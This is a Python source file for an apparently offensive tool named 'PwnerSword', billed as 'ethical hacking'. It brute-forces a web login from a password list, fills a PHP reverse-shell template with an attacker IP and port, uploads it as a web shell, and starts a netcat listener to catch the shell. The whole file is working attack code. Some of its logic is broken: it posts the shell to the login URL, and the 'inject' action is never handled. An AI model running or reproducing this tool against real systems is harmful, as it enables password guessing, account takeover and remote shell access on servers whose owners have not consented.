import requests
import argparse
import subprocess

def brute_force_login(target_url, username, password_list_file):
    with open(password_list_file, 'r') as f:
        passwords = f.read().splitlines()

    for password in passwords:
        response = requests.post(target_url, data={'username': username, 'password': password})
        
        if 'Successful login' in response.text:
            print(f"Found password: {password}")
            return password  # Return found password
    return None

def inject_reverse_shell(upload_url, shell_file_path):
    # Open the PHP reverse shell as binary
    with open(shell_file_path, 'rb') as file:
        files = {'file': file}

        # Upload the reverse shell
        response = requests.post(upload_url, files=files)

        if response.status_code == 200:
            print("Webshell uploaded successfully!")
        else:
            print("Failed to upload webshell.")

def setup_listener(port):
    print(f"Setting up listener on port {port}...")
    subprocess.run(['nc', '-lvnp', str(port)])  # Using subprocess to run netcat

def main():
    parser = argparse.ArgumentParser(description="PwnerSword: A terminal tool for ethical hacking.")
    parser.add_argument('action', choices=['brute', 'inject', 'listen'], help='Action to perform: brute force, inject payload, or set up listener.')
    parser.add_argument('--target', required=True, help='Target URL for login (e.g., http://target-url/login)')
    parser.add_argument('--username', required=True, help='Target username')
    parser.add_argument('--passwords', required=True, help='Path to password list file (e.g., passwords.txt)')
    parser.add_argument('--ip', required=True, help='IP address for the reverse shell connection')
    parser.add_argument('--port', type=int, required=True, help='Port for the reverse shell listener')
    
    args = parser.parse_args()

    if args.action == 'brute':
        found_password = brute_force_login(args.target, args.username, args.passwords)
        if found_password:
            # Prepare the reverse shell payload with replaced IP/Port
            with open('reverse_shell.php', 'r') as file:
                reverse_shell_template = file.read()

            # Save the modified reverse shell
            shell_file_path = 'reverse_shell.php'
            with open(shell_file_path, 'w') as file:
                file.write(reverse_shell_template.replace('YOUR_IP', args.ip).replace('YOUR_PORT', str(args.port)))

            # Inject the modified reverse shell
            inject_reverse_shell(args.target, shell_file_path)
    
    elif args.action == 'listen':
        setup_listener(args.port)

if __name__ == "__main__":
    main()
